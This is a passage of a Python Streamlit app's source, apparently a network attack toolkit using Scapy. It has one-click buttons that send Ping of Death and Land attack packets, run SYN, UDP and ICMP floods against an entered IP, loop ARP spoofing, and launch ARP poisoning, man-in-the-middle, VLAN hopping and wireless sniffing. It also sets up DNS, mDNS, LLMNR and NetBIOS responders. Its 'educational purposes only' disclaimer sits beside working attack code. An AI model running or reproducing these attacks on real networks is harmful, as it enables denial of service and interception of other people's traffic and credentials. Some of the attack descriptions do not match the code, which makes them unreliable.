        - **How It Works**: The target system becomes overwhelmed by processing multiple ICMP requests, potentially leading to a denial-of-service.
        - **Usage**: Use this attack to test the target's ability to manage excessive ping requests.

        ---

        ***ARP and DNS Spoofing Attacks*** 🎭

        6. **ARP Spoofing 👾**
        - **Description**: ARP Spoofing allows an attacker to intercept and modify traffic between two systems by poisoning the ARP cache.
        - **How It Works**: The attacker sends falsified ARP responses, tricking the network into routing traffic through the attacker’s machine, allowing for man-in-the-middle (MitM) attacks.
        - **Usage**: Useful for penetration testing to see how easily an attacker can intercept traffic on a local network.

        7. **DNS Spoofing 📡**
        - **Description**: DNS Spoofing redirects a target’s DNS requests to malicious IP addresses, allowing attackers to control the victim's browsing behavior.
        - **How It Works**: By forging DNS responses, the attacker can redirect users from legitimate websites to malicious sites, facilitating phishing and other attacks.
        - **Usage**: Used to test how secure a DNS infrastructure is against tampering.

        ---

        ### Important Considerations 📝
        - **Permissions**: These attacks may require elevated privileges. On Linux/macOS, use `sudo`; on Windows, run as Administrator.
        
        - **Stopping Flood Attacks**: Flooding attacks (such as SYN Flood, UDP Flood, and ICMP Flood) run in loops. To stop them, you must manually interrupt the process by halting the Streamlit server (Ctrl + C).

        - **Legal Disclaimer**: Ensure you have explicit permission before testing any network or system. Unauthorized use of these techniques is both illegal and unethical.

        Happy Testing, and stay secure! 🔐
        """)
        st.divider()


        # User Input for Attack Execution
        attack_type = st.selectbox("Select Attack Type", [
            "None",
            "Ping of Death ☠️",
            "Land Attack 🕷️",
            "SYN Flood 🌊",
            "UDP Flood 🚀",
            "ICMP Flood 🌩️",
            "ARP Spoofing 👾",
            "DNS Spoofing 📡"
        ])

        target_ip = st.text_input("Target IP", "10.0.0.5")
        conf.verb = 1  # Set Scapy verbose mode

        if st.button("Execute Attack"):
            # Validate IP address
            try:
                socket.inet_aton(target_ip)  # Check if it's a valid IP address
            except socket.error:
                st.error("Invalid IP address format! ❌ Please enter a valid IP.")
                st.stop()

            # Execute selected attack
            if attack_type == "Ping of Death ☠️":
                st.write("Executing Ping of Death attack... 🐾")
                send(fragment(IP(dst=target_ip)/ICMP()/("X"*60000)))
                st.success("Ping of Death attack sent. 💥")

            elif attack_type == "Land Attack 🕷️":
                st.write("Executing Land Attack... 🔥")
                send(IP(src=target_ip, dst=target_ip)/TCP(sport=135, dport=135))
                st.success("Land attack sent. 🔥")

            elif attack_type == "SYN Flood 🌊":
                st.write("Executing SYN Flood attack... 🌊")
                threading.Thread(target=start_syn_flood, args=(target_ip,), daemon=True).start()
                st.success("SYN Flood attack initiated. 🌊")

            elif attack_type == "UDP Flood 🚀":
                st.write("Executing UDP Flood attack... 🚀")
                threading.Thread(target=start_udp_flood, args=(target_ip,), daemon=True).start()
                st.success("UDP Flood attack initiated. 🚀")

            elif attack_type == "ICMP Flood 🌩️":
                st.write("Executing ICMP Flood attack... 🌩️")
                threading.Thread(target=start_icmp_flood, args=(target_ip,), daemon=True).start()
                st.success("ICMP Flood attack initiated. 🌩️")

            elif attack_type == "ARP Spoofing 👾":
                gateway_ip = st.text_input("Gateway IP", "10.0.0.1")
                if st.button("Start ARP Spoofing"):
                    st.write("Starting ARP Spoofing...")
                    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff"), loop=1, verbose=0)
                    st.success("ARP Spoofing initiated! 👾")

            elif attack_type == "DNS Spoofing 📡":
                dns_target = st.text_input("DNS Target IP", "8.8.8.8")
                if st.button("Start DNS Spoofing"):
                    st.write("Starting DNS Spoofing...")
                    send(IP(dst=dns_target)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="example.com", qtype="A")), loop=1, verbose=0)
                    st.success("DNS Spoofing initiated! 📡")

            else:
                st.warning("Select a valid attack type. ❗")

        # Button to stop all attacks
        if st.button("Stop Attack Immediately 🛑"):
            stop_attacks()

    # ARP Cache Poisoning Section
    elif section == "📡 ARP Cache Poisoning":
        st.header("📡 ARP Cache Poisoning")
        
        # Informative Description
        st.write("""
        **What is ARP Cache Poisoning?**  
        ARP (Address Resolution Protocol) cache poisoning is a technique used to disrupt network communications by sending false ARP messages over a local area network (LAN). This attack tricks a target device into associating the attacker's MAC address with the IP address of a legitimate device (like a gateway), allowing the attacker to intercept, modify, or drop packets intended for that device.

        **Workflow of ARP Cache Poisoning:**  
        1. **Input Client MAC**: Enter the MAC address of the target client you wish to poison.
        2. **Input Gateway IP**: Specify the IP address of the gateway you want to impersonate.
        3. **Start Poisoning**: Initiate the ARP poisoning attack to redirect traffic intended for the gateway to your device.

        **Uses and Purpose:**  
        - **Man-in-the-Middle (MitM) Attacks**: ARP cache poisoning is often used as a precursor to MitM attacks, where the attacker intercepts and possibly alters communications between two parties.
        - **Network Analysis**: Security professionals can use this technique to test the resilience of a network against such vulnerabilities and to educate users about potential risks.
        - **Traffic Sniffing**: By redirecting traffic, attackers can capture sensitive information, such as login credentials and private messages.

        **Important Note**:  
        ARP poisoning is a powerful technique that should only be used in controlled environments or with explicit permission from network owners. Unauthorized use can lead to severe legal repercussions.

        **How It Works:**  
        - The attacker sends spoofed ARP messages to the network, telling the target client that the attacker's MAC address corresponds to the gateway's IP address. 
        - As a result, the target client sends its traffic intended for the gateway to the attacker's machine instead.
        - The attacker can then relay the traffic to the actual gateway, maintaining the appearance of a normal connection while intercepting sensitive data.

        **Example Parameters**:  
        - **Client MAC**: The MAC address of the target device (e.g., `00:00:00:00:00:00`).
        - **Gateway IP**: The IP address of the legitimate gateway (e.g., `192.168.1.1`).
        """)

        # User Input for ARP Poisoning Execution
        st.divider()
        client_mac = st.text_input("Client MAC (Format: XX:XX:XX:XX:XX:XX" , "00:00:00:00:00:00")
        gateway_ip = st.text_input("Gateway IP (Format: X.X.X.X)", "192.168.1.1")
        target_ip = st.text_input("Target IP (Format: X.X.X.X)", "192.168.1.5")  # Add a target IP input

        # Validate MAC address
        def is_valid_mac(mac):
            return re.match(r"^([0-9a-f]{2}[:-]){5}([0-9a-f]{2})$", mac.lower()) is not None

        # Validate IP address
        def is_valid_ip(ip):
            return re.match(r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.("
                            r"25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.("
                            r"25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.("
                            r"25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$", ip) is not None

        if st.button("Start ARP Poisoning"):
            # Validate inputs
            if not is_valid_mac(client_mac):
                st.error("Invalid MAC address format.")
            elif not is_valid_ip(gateway_ip):
                st.error("Invalid Gateway IP address format.")
            elif not is_valid_ip(target_ip):
                st.error("Invalid Target IP address format.")
            else:
                # Initiate ARP poisoning
                if arp_poisoning(client_mac, gateway_ip, target_ip):
                    st.success("ARP cache poisoning started. 🐍")


    # ARP MitM Attack Section
    elif section == "🕵️‍♂️ ARP MitM Attack":
        st.header("🕵️‍♂️ ARP MitM Attack")
        
        # Informative Description
        st.write("""
        **What is an ARP MitM Attack?**  
        An ARP Man-in-the-Middle (MitM) attack occurs when an attacker intercepts communication between two devices on a local area network (LAN) by exploiting the Address Resolution Protocol (ARP). By sending falsified ARP messages, the attacker can make their device appear as the intended recipient, allowing them to intercept, alter, or monitor traffic.

        **Workflow of ARP MitM Attack:**  
        1. **Input Target IPs**: Enter the IP addresses of the two targets you wish to intercept traffic between.
        2. **Initiate Attack**: Start the ARP MitM attack to begin intercepting traffic between the specified targets.

        **Uses and Purpose:**  
        - **Data Interception**: This attack allows attackers to capture sensitive data such as passwords, personal information, and other confidential communications.
        - **Network Monitoring**: Security professionals can use this technique to evaluate network security and test for vulnerabilities in real-time.
        - **Education and Awareness**: Demonstrating this attack helps users understand the importance of securing their networks against such vulnerabilities.

        **Important Note**:  
        ARP MitM attacks can lead to serious security breaches and should only be conducted in authorized environments for educational or security assessment purposes. Unauthorized use can result in severe legal consequences.

        **How It Works:**  
        - The attacker sends spoofed ARP packets to both target devices, informing them that the attacker’s MAC address corresponds to the IP address of the other target.
        - As a result, both targets believe they are communicating directly with each other, while in reality, their traffic is routed through the attacker’s device.
        - This allows the attacker to capture and potentially manipulate the data being transmitted between the targets.

        **Example Parameters**:  
        - **Target 1 IP**: The IP address of the first device (e.g., `192.168.1.2`).
        - **Target 2 IP**: The IP address of the second device (e.g., `192.168.1.3`).
        """)

        # User input fields for targets      
        target1 = st.text_input("Target 1 IP (Format: X.X.X.X)", "192.168.1.2")
        target2 = st.text_input("Target 2 IP (Format: X.X.X.X)", "192.168.1.3")

        # Validate IP address using regex
        def is_valid_ip(ip):
            return re.match(r"^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.("
                            r"25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.("
                            r"25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.("
                            r"25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$", ip) is not None

        if st.button("Execute ARP MitM"):
            # Validate inputs
            if not is_valid_ip(target1):
                st.error("Invalid Target 1 IP address format.")
            elif not is_valid_ip(target2):
                st.error("Invalid Target 2 IP address format.")
            else:
                # Initiate ARP MitM attack
                if arp_mitm(target1, target2):
                    st.success("ARP MitM attack initiated. 🥷")


    # TCP Port Scanning Section
    elif section == "🔍 TCP Port Scanning":
        st.header("🔍 TCP Port Scanning")
        
        # Informative Description
        st.write("""
        **What is TCP Port Scanning?**  
        TCP port scanning is a technique used to identify open ports and services available on a target device or server. By scanning ports, you can gain insights into the network's security posture, identify potential vulnerabilities, and understand which services are actively running.

        **Workflow of TCP Port Scanning:**  
        1. **Input Target IP**: Enter the IP address of the target device you want to scan.
        2. **Select Ports**: Choose from a list of common ports or enter custom ports you wish to scan.
        3. **Initiate Scan**: Click the button to start scanning the selected ports on the target device.

        **Uses and Purpose:**  
        - **Security Assessment**: Identify open ports to evaluate the security of a network and detect potential vulnerabilities.
        - **Service Identification**: Discover which services are running on a device, helping with inventory management and security auditing.
        - **Network Troubleshooting**: Determine connectivity issues and verify if the necessary services are accessible on the target device.

        **How It Works:**  
        - The scanner sends TCP SYN packets to the specified ports on the target IP.
        - If a port responds with a SYN-ACK packet, it indicates that the port is open and a service is listening on that port.
        - Ports that respond with RST packets are considered closed, while ports that do not respond are classified as filtered or stealth.

        **Example Parameters:**  
        - **Scan Target IP**: The IP address of the device you want to scan (e.g., `192.168.1.5`).
        - **Select Ports**: Choose from commonly used ports like SSH (22), HTTP (80), and HTTPS (443), or enter custom ports for a tailored scan.
        """)

        # User Input for TCP Port Scanning
        scan_target = st.text_input("Scan Target IP", "192.168.1.5")

        # Selectbox to choose ports
        selected_ports = st.multiselect("Select Ports to Scan", 
                                        options=list(port_details.keys()), 
                                        format_func=lambda port: port_details[port]["name"],
                                        default=[22, 80, 443])  # Default selection
        
        # Input for custom ports
        custom_ports_input = st.text_input("Enter Custom Ports (comma-separated, e.g., 21, 8080)", "")

        if st.button("Start TCP Port Scan"):
            # Validate and parse custom ports
            custom_ports = []
            if custom_ports_input:
                try:
                    custom_ports = [int(port.strip()) for port in custom_ports_input.split(",") if port.strip().isdigit()]
                except ValueError:
                    st.error("Please enter valid integer port numbers.")

            # Combine selected common ports and custom ports
            combined_ports = selected_ports + custom_ports

            if not combined_ports:
                st.warning("Please select at least one port to scan.")
            else:
                open_ports = tcp_port_scan(scan_target, combined_ports)
                st.write(f"🔍 Open ports on {scan_target}:")
                if open_ports:
                    for port, name in open_ports.items():
                        st.success(f"✅ Port {port} is open ({name}).")
                else:
                    st.info("No open ports found.")

                # Display port details
                st.write("### Port Details:")
                for port in combined_ports:
                    details = port_details.get(port)
                    if details:
                        st.markdown(f"**Port {port}:** {details['name']} - {details['description']}")

    # DNS Server Setup Section
    elif section == "📜 DNS Server Setup":
        st.header("📜 DNS Server Setup")
        
        # Informative Description
        st.write("""
        **What is DNS Server Setup?**  
        Setting up a DNS (Domain Name System) server allows you to manage domain name resolutions within your network. This setup translates user-friendly domain names into IP addresses, ensuring that users can easily access websites and resources without needing to remember complex numerical addresses.

        **Workflow of DNS Server Setup:**  
        1. **Select Network Interface**: Specify the network interface on which the DNS server will operate (e.g., `eth0`).
        2. **Define Match Criteria**: Input the domain and the corresponding IP address you want to resolve (e.g., `example.com:192.168.1.100`).
        3. **Initiate Setup**: Click the button to configure the DNS server with the specified parameters.

        **Uses and Purpose:**  
        - **Local Network Management**: Perfect for managing domain name resolutions in private networks, making it easier for users to access services.
        - **Testing and Development**: Useful in testing environments to simulate DNS resolutions for specific applications or services.
        - **Improved Performance**: By hosting your DNS server, you can reduce lookup times and improve overall network performance.

        **How It Works:**  
        When a DNS query is received, the DNS server checks its records for the matching domain and returns the associated IP address. This process allows for efficient and reliable access to resources on your network.
        """)

        dns_interface = st.text_input("Network Interface", "eth0")
        dns_match = st.text_input("Match (e.g., domain: answer)", "example.com:192.168.1.100")
        
        if st.button("Setup DNS Server"):
            if not dns_interface:
                st.warning("Please enter a valid network interface.")
            else:
                setup_dns_server(dns_interface, match=dns_match)
                st.success("DNS Server setup complete. 🌐")


    # mDNS Server Setup Section
    elif section == "🌐 mDNS Server Setup":
        st.header("🌐 mDNS Server Setup")
        
        # Informative Description
        st.write("""
        **What is mDNS Server Setup?**  
        Multicast DNS (mDNS) allows devices on the same local network to discover each other without the need for a central DNS server. This is especially useful in environments where devices need to communicate seamlessly without manual configuration.

        **Workflow of mDNS Server Setup:**  
        1. **Select mDNS Interface**: Specify the network interface where the mDNS server will be set up (e.g., `eth0`).
        2. **Configure Joker IP**: Input the joker IP address, which acts as a fallback or wildcard for mDNS queries (e.g., `192.168.1.1`).
        3. **Initiate Setup**: Click the button to configure the mDNS server with the specified parameters.

        **Uses and Purpose:**  
        - **Automatic Device Discovery**: Facilitates automatic discovery of devices on local networks, making it easy to connect printers, cameras, and other services.
        - **Zero Configuration Networking**: Ideal for environments where devices are frequently added or removed, as it eliminates the need for manual configuration.
        - **Home and Office Networking**: Enhances connectivity between devices in home and office setups, allowing for easier sharing of resources.

        **How It Works:**  
        The mDNS server listens for queries on the local network and responds to devices seeking information about services and hosts. This protocol uses multicast addressing to ensure efficient communication between devices.
        """)

        mdns_interface = st.text_input("mDNS Interface", "eth0")
        mdns_joker = st.text_input("Joker IP", "192.168.1.1")
        
        if st.button("Setup mDNS Server"):
            if not mdns_interface or not is_valid_ip(mdns_joker):
                st.warning("Please enter a valid mDNS interface and Joker IP.")
            else:
                setup_mdns_server(mdns_interface, joker=mdns_joker)
                st.success("mDNS Server setup complete. 🌐")


    # LLMNR Server Setup Section
    elif section == "🔗 LLMNR Server Setup":
        st.header("🔗 LLMNR Server Setup")
        
        # Informative Description
        st.write("""
        **What is LLMNR?**  
        Link-Local Multicast Name Resolution (LLMNR) is a protocol that allows hosts on the same local network to resolve each other's names without the need for a DNS server. This is particularly useful in environments where a DNS server is unavailable or impractical.

        **Workflow of LLMNR Server Setup:**  
        1. **Select LLMNR Interface**: Choose the network interface that will host the LLMNR server (e.g., `eth0`).
        2. **Define From IP**: Enter the IP address from which the LLMNR server will respond to queries (e.g., `10.0.0.1`).
        3. **Initiate Setup**: Click the button to configure the LLMNR server with the specified parameters.

        **Uses and Purpose:**  
        - **Local Name Resolution**: Facilitates easy name resolution for devices on the same local network without relying on an external DNS.
        - **Seamless Networking**: Enhances connectivity in environments where quick access to network resources is needed without extensive configurations.
        - **Testing and Development**: Useful in testing scenarios to simulate name resolution in a controlled environment.

        **How It Works:**  
        When a device on the network sends a name resolution request, the LLMNR server listens for multicast requests and responds with the corresponding IP address, allowing for quick access to network resources.
        """)

        llmnr_interface = st.text_input("LLMNR Interface", "eth0")
        llmnr_ip = st.text_input("From IP", "10.0.0.1")
        
        if st.button("Setup LLMNR Server"):
            if not llmnr_interface or not is_valid_ip(llmnr_ip):
                st.warning("Please enter a valid LLMNR interface and From IP.")
            else:
                setup_llmnr_server(llmnr_interface, from_ip=llmnr_ip)
                st.success("LLMNR Server setup complete. 🔗")


    # Netbios Server Setup Section
    elif section == "📡 NTbios Server Setup":
        st.header("📡 Netbios Server Setup")
        
        # Informative Description
        st.write("""
        **What is NetBIOS?**  
        NetBIOS (Network Basic Input/Output System) is a networking protocol that allows applications on different computers to communicate within a local area network (LAN). It provides services related to the session layer of the OSI model, enabling applications to establish sessions for data exchange.

        **Workflow of NetBIOS Server Setup:**  
        1. **Select NetBIOS Interface**: Specify the network interface that will host the NetBIOS server (e.g., `eth0`).
        2. **Define Local IP (optional)**: Input the local IP address that the NetBIOS server will use (e.g., `192.168.1.5`). This step is optional if you want the server to listen on all interfaces.
        3. **Initiate Setup**: Click the button to configure the NetBIOS server with the specified parameters.

        **Uses and Purpose:**  
        - **Legacy Application Support**: Essential for supporting older applications that rely on NetBIOS for communication and resource sharing.
        - **File and Printer Sharing**: Facilitates easy sharing of files and printers in local networks without complex configurations.
        - **Home Networking**: Useful in home networks to allow devices to easily discover and connect to each other.

        **How It Works:**  
        The NetBIOS server listens for requests from other devices on the local network and responds with the necessary information to establish a connection. It allows for easy identification and communication between networked devices.
        """)

        netbios_interface = st.text_input("Netbios Interface", "eth0")
        local_ip = st.text_input("Local IP (optional)", "192.168.1.5")
        
        if st.button("Setup Netbios Server"):
            if not netbios_interface or (local_ip and not is_valid_ip(local_ip)):
                st.warning("Please enter a valid Netbios interface and Local IP if specified.")
            else:
                setup_netbios_server(netbios_interface, local_ip=local_ip)
                st.success("Netbios Server setup complete. 📡")


    # TCP SYN Traceroute Section
    elif section == "🔍 TCP SYN Traceroute":
        st.header("🔍 TCP SYN Traceroute")
        
        # Informative Description
        st.write("""
        **What is TCP SYN Traceroute?**  
        TCP SYN Traceroute is a method used to determine the path packets take from the source to a destination host using SYN packets. This technique leverages the TCP handshake mechanism to discover the hops in the network.

        **Workflow of TCP SYN Traceroute:**  
        1. **Enter Target IP**: Specify the IP address of the target you want to trace (e.g., `8.8.8.8`).
        2. **Initiate Traceroute**: Click the button to start the TCP SYN Traceroute process.
        3. **View Results**: Analyze the traceroute results, which include details about each hop along the route.

        **Uses and Purpose:**  
        - **Network Path Analysis**: Helps in understanding how data travels across the network and identifying potential bottlenecks or failures.
        - **Troubleshooting Connectivity Issues**: Aids in diagnosing connectivity problems by showing where packets are being dropped or delayed.
        - **Security Assessments**: Useful in network security assessments to analyze the routing and response behavior of target hosts.

        **How It Works:**  
        TCP SYN packets are sent to the target, and the intermediate routers respond with ICMP Time Exceeded messages or the target responds with a SYN-ACK if it is reachable. By analyzing these responses, the traceroute reveals the path taken through the network.
        """)
        
        traceroute_target_ip = st.text_input("Traceroute Target IP", "8.8.8.8")
        if st.button("Start TCP SYN Traceroute"):
            tcp_syn_results = tcp_syn_traceroute(traceroute_target_ip)
            st.write("### Traceroute Results:")
            if tcp_syn_results:
                for hop in tcp_syn_results:
                    st.write(f"**TTL:** {hop['ttl']} | **Source IP:** {hop['src_ip']} | **Reply IP:** {hop['reply_ip']} | **ICMP Type:** {hop['icmp_type']} | **TCP Flags:** {hop['tcp_flags']}")
            else:
                st.write("No results received.")


    # UDP Traceroute Section
    elif section == "🌐 UDP Traceroute":
        st.header("🌐 UDP Traceroute")
        
        # Informative Description
        st.write("""
        **What is UDP Traceroute?**  
        UDP Traceroute is a method for tracing the path taken by UDP packets from the source to a destination. It uses the UDP protocol to discover the route and measures the response times of each hop.

        **Workflow of UDP Traceroute:**  
        1. **Enter Target IP**: Specify the IP address of the target for the traceroute (e.g., `8.8.8.8`).
        2. **Initiate Traceroute**: Click the button to start the UDP Traceroute process.
        3. **View Results**: Analyze the results detailing each hop and the characteristics of the responses received.

        **Uses and Purpose:**  
        - **Path Analysis**: Provides insights into how data travels across the network via UDP, which is commonly used for real-time applications.
        - **Diagnosing Network Issues**: Helps identify potential points of failure or high latency in the path to a target host.
        - **Network Performance Evaluation**: Useful for assessing the performance and reliability of a network.

        **How It Works:**  
        UDP packets are sent with incrementally increasing TTL (Time to Live) values. Each router along the path decrements the TTL and responds with ICMP Time Exceeded messages until the target is reached. This information allows the traceroute to map the path taken by the packets.
        """)

        udp_target_ip = st.text_input("UDP Target IP", "8.8.8.8")
        if st.button("Start UDP Traceroute"):
            udp_results = udp_traceroute(udp_target_ip)

            st.write("### UDP Traceroute Results:")
            if udp_results:
                for hop in udp_results:
                    st.write(
                        f"**Hop:** {hop['hop']} | "
                        f"**Source IP:** {hop['src_ip']} | "
                        f"**Destination IP:** {hop['dst_ip']} | "
                        f"**Reply IP:** {hop['reply_ip']} | "
                        f"**ICMP Type:** {hop['reply_type']} | "
                        f"**ICMP Code:** {hop['reply_code']} | "
                        f"**Length:** {hop['length']} | "
                        f"**TTL of Reply:** {hop['ttl']} | "
                        f"**Protocol:** {hop['protocol']}"
                    )
            else:
                st.write("No response received or no hops detected.")


    # DNS Traceroute Section
    elif section == "📡 DNS Traceroute":
        st.header("📡 DNS Traceroute")
        
        # Informative Description
        st.write("""
        **What is DNS Traceroute?**  
        DNS Traceroute is a diagnostic tool used to trace the path that DNS queries take to resolve a domain name. It helps in understanding how DNS resolution occurs across the network.

        **Workflow of DNS Traceroute:**  
        1. **Enter Target IP**: Specify the IP address for the DNS traceroute (e.g., `8.8.8.8`).
        2. **Enter Domain Name**: Input the domain name you want to trace (e.g., `google.com`).
        3. **Initiate Traceroute**: Click the button to start the DNS Traceroute process.
        4. **View Results**: Analyze the traceroute results, which show each hop in the DNS resolution process.

        **Uses and Purpose:**  
        - **DNS Resolution Analysis**: Helps visualize the path taken by DNS queries, allowing for better understanding and troubleshooting of DNS resolution.
        - **Identifying DNS Issues**: Useful for diagnosing problems related to DNS configuration and performance.
        - **Network Monitoring**: Aids in monitoring DNS responses and understanding how DNS queries are routed.

        **How It Works:**  
        DNS queries are sent to the specified target, and each resolver along the path returns responses, including any necessary referrals. The traceroute reveals how DNS queries are processed across the network, providing insights into the DNS resolution process.
        """)

        dns_traceroute_target_ip = st.text_input("DNS Traceroute Target IP", "8.8.8.8")
        domain_for_dns_traceroute = st.text_input("Domain for DNS Traceroute", "google.com")
        if st.button("Start DNS Traceroute"):
            dns_trace_result = dns_traceroute(dns_traceroute_target_ip, domain_for_dns_traceroute)
            st.success("DNS Traceroute executed. 📡")
            
            # Check if results are not empty
            if dns_trace_result:
                st.write("### Traceroute Results:")
                for hop in dns_trace_result:
                    st.write(
                        f"**Hop:** {hop['hop']} | "
                        f"**Source IP:** {hop['src_ip']} | "
                        f"**Destination IP:** {hop['dst_ip']} | "
                        f"**Reply IP:** {hop['reply_ip']} | "
                        f"**DNS Type:** {hop['dns_type']} | "
                        f"**Response Code:** {hop['response_code']} | "
                        f"**Length:** {hop['length']} | "
                        f"**Protocol:** {hop['protocol']}"
                    )
            else:
                st.write("No results received.")


    # Etherleaking Section
    elif section == "🛠 Etherleaking":
        st.header("🛠 Etherleaking")
        
        # Informative Description
        st.write("""
        **What is Etherleaking?**  
        Etherleaking is a technique used to intercept and capture Ethernet frames in a network. This can help in monitoring traffic and identifying sensitive information that might be exposed unintentionally.

        **Workflow of Etherleaking:**  
        1. **Enter Target IP**: Specify the IP address of the target you want to monitor (e.g., `192.168.1.5`).
        2. **Initiate Etherleaking**: Click the button to start the Etherleaking process.
        3. **View Results**: Analyze the captured results, which show intercepted Ethernet frames.

        **Uses and Purpose:**  
        - **Network Traffic Monitoring**: Useful for network administrators to monitor traffic and identify potential security issues.
        - **Information Security Assessments**: Helps in penetration testing to identify sensitive data leaks.
        - **Debugging Network Issues**: Assists in troubleshooting network problems by analyzing the frames exchanged.

        **How It Works:**  
        Etherleaking works by listening to the network traffic and capturing Ethernet frames. It can reveal information about communication patterns, exposed services, and potential vulnerabilities in the network.
        """)
        
        ether_target_ip = st.text_input("Etherleaking Target IP", "192.168.1.5")
        if st.button("Start Etherleaking"):
            results = ether_leaking(ether_target_ip)  # Call the updated function
            st.write("### Etherleaking Results:")
            st.text(results)  # Display the results


    # ICMP Leaking Section
    elif section == "🧬 ICMP Leaking":
        st.header("🧬 ICMP Leaking")
        
        # Informative Description
        st.write("""
        **What is ICMP Leaking?**  
        ICMP leaking involves sending and capturing ICMP packets to extract information about the target's network structure and connectivity. This can reveal insights into the target’s network topology and potential vulnerabilities.

        **Workflow of ICMP Leaking:**  
        1. **Enter Target IP**: Specify the IP address of the target for ICMP leaking (e.g., `192.168.1.5`).
        2. **Initiate ICMP Leaking**: Click the button to start the ICMP leaking process.
        3. **View Results**: Analyze the results, which display the captured ICMP messages.

        **Uses and Purpose:**  
        - **Network Discovery**: Useful for identifying hosts and their status within a network.
        - **Security Audits**: Helps in assessing network vulnerabilities by examining the ICMP responses.
        - **Path MTU Discovery**: Assists in understanding the maximum transmission unit across a path.

        **How It Works:**  
        ICMP packets are sent to the target, and responses are captured to analyze the network’s behavior. This can reveal information about reachable hosts and any potential filtering mechanisms in place.
        """)

        icmp_target_ip = st.text_input("ICMP Leaking Target IP", "192.168.1.5")
        if st.button("Start ICMP Leaking"):
            results = icmp_leaking(icmp_target_ip)
            st.success("ICMP Leaking executed. 🧬")
            st.write("### ICMP Leaking Results:")
            st.text(results)


    # VLAN Hopping Section
    elif section == "🔀 VLAN Hopping":
        st.header("🔀 VLAN Hopping")
        
        # Informative Description
        st.write("""
        **What is VLAN Hopping?**  
        VLAN hopping is a technique used to exploit vulnerabilities in VLAN configurations to gain access to traffic on other VLANs. This can pose significant security risks in a network environment.

        **Workflow of VLAN Hopping:**  
        1. **Enter Target IP**: Specify the IP address of the target for VLAN hopping (e.g., `192.168.1.5`).
        2. **Initiate VLAN Hopping**: Click the button to start the VLAN hopping process.
        3. **View Results**: Analyze the results to see the traffic that was sent and received.

        **Uses and Purpose:**  
        - **Security Testing**: Helps in identifying misconfigured VLANs and potential points of attack in a network.
        - **Network Vulnerability Assessments**: Useful for assessing the overall security posture of a network.
        - **Traffic Analysis**: Aids in monitoring the traffic flow across different VLANs.

        **How It Works:**  
        VLAN hopping exploits the way switches handle VLAN tagging. By crafting specific packets, an attacker can bypass VLAN segregation and gain access to other VLANs, which can be captured and analyzed.
        """)

        vlan_target_ip = st.text_input("VLAN Hopping Target IP", "192.168.1.5")
        if st.button("Start VLAN Hopping"):
            vlan_results = vlan_hopping(vlan_target_ip)
            if vlan_results:
                st.success("VLAN Hopping executed. 🔀")
                st.write("### Results:")
                for sent, received in vlan_results:
                    st.write(f"**Sent:** {sent.summary()} | **Received:** {received.summary()}")
            else:
                st.write("No response received.")

    # Wireless Sniffing Section
    elif section == "📶 Wireless Sniffing":
        st.header("📶 Wireless Sniffing")

        # Informative Description
        st.write("""
        **What is Wireless Sniffing?**  
        Wireless sniffing is a technique used to intercept and analyze data packets transmitted over wireless networks. This allows security professionals to monitor network traffic, detect vulnerabilities, and analyze communications.

        **Workflow of Wireless Sniffing:**  
        1. **Select Wireless Interface**: Specify the wireless interface you want to use for sniffing (e.g., `wlan0`).
        2. **Start Sniffing**: Click the button to initiate the wireless sniffing process.
        3. **Monitor Traffic**: The tool will start capturing wireless packets, which can then be analyzed for insights.

        **Uses and Purpose:**  
        - **Network Analysis**: Helpful for network administrators to monitor traffic and optimize network performance.
        - **Security Audits**: Allows for identifying vulnerabilities in wireless networks and assessing overall security posture.
        - **Troubleshooting**: Assists in diagnosing connectivity issues and identifying rogue devices on the network.
        - **Data Capture**: Captures sensitive information such as passwords and usernames for security assessments (ensure legal compliance).

        **How It Works:**  
        Wireless sniffing involves putting the wireless interface into promiscuous mode, allowing it to capture all packets in the air, regardless of their destination. The captured packets can then be analyzed to extract useful information about the network, such as devices connected, traffic patterns, and any vulnerabilities present.
        """)

        # Autodetect available wireless interfaces
        available_interfaces = get_if_list()
        wireless_interfaces = [iface for iface in available_interfaces if "wlan" in iface]

        if wireless_interfaces:
            sniff_iface = st.selectbox("Select Wireless Interface", wireless_interfaces)
        else:
            st.warning("No wireless interfaces found on this system. Please check your network configuration.")

        if st.button("Start Wireless Sniffing"):
            if not sniff_iface:
                st.warning("Please select a valid wireless interface.")
            else:
                wireless_sniffing(sniff_iface)
                st.success(f"Wireless Sniffing started on {sniff_iface}. 📶")

# Cleanup code (if needed)
if __name__ == "__main__":
    st.divider()
    st.markdown("""
⚠️ **Important Notice:**

This application is designed for **educational purposes only**. 🔍 

Please use it **responsibly** and **at your own risk**. The developer is not liable for any consequences resulting from its use. 

**Stay ethical and safe in your networking practices!** 💻✨
""")

